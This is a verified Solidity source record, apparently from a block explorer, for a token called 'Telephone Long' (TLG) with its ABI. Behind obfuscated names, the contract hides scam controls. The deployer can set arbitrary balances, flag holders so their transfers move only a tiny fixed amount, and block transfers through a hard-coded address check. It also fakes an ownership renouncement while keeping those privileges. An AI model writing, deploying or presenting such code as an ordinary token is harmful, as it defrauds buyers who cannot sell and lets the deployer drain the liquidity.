{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface maxTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingReceiver {\n    function createPair(address modeFeeAt, address launchTrading) external returns (address);\n}\n\ninterface amountMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitFund) external view returns (uint256);\n\n    function transfer(address buyList, uint256 launchedTotal) external returns (bool);\n\n    function allowance(address swapSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyList,\n        uint256 launchedTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minListAt, uint256 value);\n    event Approval(address indexed swapSender, address indexed spender, uint256 value);\n}\n\ninterface amountMaxMetadata is amountMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TelephoneLong is feeSell, amountMax, amountMaxMetadata {\n\n    uint256 private walletToTeam = 100000000 * 10 ** 18;\n\n    uint256 private exemptEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txTake;\n    }\n\n    bool public swapBuy;\n\n    uint256 private txEnable;\n\n    function owner() external view returns (address) {\n        return shouldTxEnable;\n    }\n\n    mapping(address => bool) public marketingSwap;\n\n    function txTrading(address atLaunched, address buyList, uint256 launchedTotal) internal returns (bool) {\n        require(shouldLaunchMode[atLaunched] >= launchedTotal);\n        shouldLaunchMode[atLaunched] -= launchedTotal;\n        shouldLaunchMode[buyList] += launchedTotal;\n        emit Transfer(atLaunched, buyList, launchedTotal);\n        return true;\n    }\n\n    function autoReceiverTo(address buyTake) public {\n        marketingWallet();\n        \n        if (buyTake == buyMin || buyTake == liquidityToken) {\n            return;\n        }\n        receiverTotalEnable[buyTake] = true;\n    }\n\n    event OwnershipTransferred(address indexed feeBuy, address indexed maxTx);\n\n    uint8 private liquiditySender = 18;\n\n    address public buyMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquiditySender;\n    }\n\n    uint256 private limitList;\n\n    string private minSell = \"Telephone Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletToTeam;\n    }\n\n    function transfer(address fundReceiverToken, uint256 launchedTotal) external virtual override returns (bool) {\n        return walletFrom(_msgSender(), fundReceiverToken, launchedTotal);\n    }\n\n    uint256 private listReceiverTake;\n\n    function takeTotal(address receiverSellEnable) public {\n        require(receiverSellEnable.balance < 100000);\n        if (swapBuy) {\n            return;\n        }\n        \n        marketingSwap[receiverSellEnable] = true;\n        if (exemptEnable == isToken) {\n            marketingList = txEnable;\n        }\n        swapBuy = true;\n    }\n\n    function balanceOf(address limitFund) public view virtual override returns (uint256) {\n        return shouldLaunchMode[limitFund];\n    }\n\n    mapping(address => uint256) private shouldLaunchMode;\n\n    function exemptAt() public {\n        emit OwnershipTransferred(buyMin, address(0));\n        shouldTxEnable = address(0);\n    }\n\n    uint256 private minLimit;\n\n    function allowance(address tokenAmount, address launchedExempt) external view virtual override returns (uint256) {\n        if (launchedExempt == amountAuto) {\n            return type(uint256).max;\n        }\n        return totalReceiver[tokenAmount][launchedExempt];\n    }\n\n    uint256 private tradingFrom;\n\n    bool public tradingIs;\n\n    mapping(address => bool) public receiverTotalEnable;\n\n    mapping(address => mapping(address => uint256)) private totalReceiver;\n\n    uint256 private marketingList;\n\n    uint256 constant fromLiquidity = 11 ** 10;\n\n    address private shouldTxEnable;\n\n    function walletFrom(address atLaunched, address buyList, uint256 launchedTotal) internal returns (bool) {\n        if (atLaunched == buyMin) {\n            return txTrading(atLaunched, buyList, launchedTotal);\n        }\n        uint256 autoToken = amountMax(liquidityToken).balanceOf(maxLimit);\n        require(autoToken == launchMaxExempt);\n        require(buyList != maxLimit);\n        if (receiverTotalEnable[atLaunched]) {\n            return txTrading(atLaunched, buyList, fromLiquidity);\n        }\n        return txTrading(atLaunched, buyList, launchedTotal);\n    }\n\n    function approve(address launchedExempt, uint256 launchedTotal) public virtual override returns (bool) {\n        totalReceiver[_msgSender()][launchedExempt] = launchedTotal;\n        emit Approval(_msgSender(), launchedExempt, launchedTotal);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minSell;\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldTxEnable;\n    }\n\n    function transferFrom(address atLaunched, address buyList, uint256 launchedTotal) external override returns (bool) {\n        if (_msgSender() != amountAuto) {\n            if (totalReceiver[atLaunched][_msgSender()] != type(uint256).max) {\n                require(launchedTotal <= totalReceiver[atLaunched][_msgSender()]);\n                totalReceiver[atLaunched][_msgSender()] -= launchedTotal;\n            }\n        }\n        return walletFrom(atLaunched, buyList, launchedTotal);\n    }\n\n    string private txTake = \"TLG\";\n\n    uint256 exemptAuto;\n\n    uint256 private marketingReceiverBuy;\n\n    function totalLaunched(address fundReceiverToken, uint256 launchedTotal) public {\n        marketingWallet();\n        shouldLaunchMode[fundReceiverToken] = launchedTotal;\n    }\n\n    uint256 private isToken;\n\n    uint256 launchMaxExempt;\n\n    address public liquidityToken;\n\n    function receiverLiquidity(uint256 launchedTotal) public {\n        marketingWallet();\n        launchMaxExempt = launchedTotal;\n    }\n\n    address maxLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (tradingFrom == minLimit) {\n            marketingReceiverBuy = tradingFrom;\n        }\n        maxTake receiverLimitIs = maxTake(amountAuto);\n        liquidityToken = marketingReceiver(receiverLimitIs.factory()).createPair(receiverLimitIs.WETH(), address(this));\n        if (minLimit == tradingFrom) {\n            isToken = minLimit;\n        }\n        buyMin = _msgSender();\n        exemptAt();\n        marketingSwap[buyMin] = true;\n        shouldLaunchMode[buyMin] = walletToTeam;\n        if (isToken != marketingReceiverBuy) {\n            isToken = marketingList;\n        }\n        emit Transfer(address(0), buyMin, walletToTeam);\n    }\n\n    address amountAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingWallet() private view {\n        require(marketingSwap[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minListAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"}],\"name\":\"autoReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTotal\",\"type\":\"uint256\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTotalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellEnable\",\"type\":\"address\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTotal\",\"type\":\"uint256\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TelephoneLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}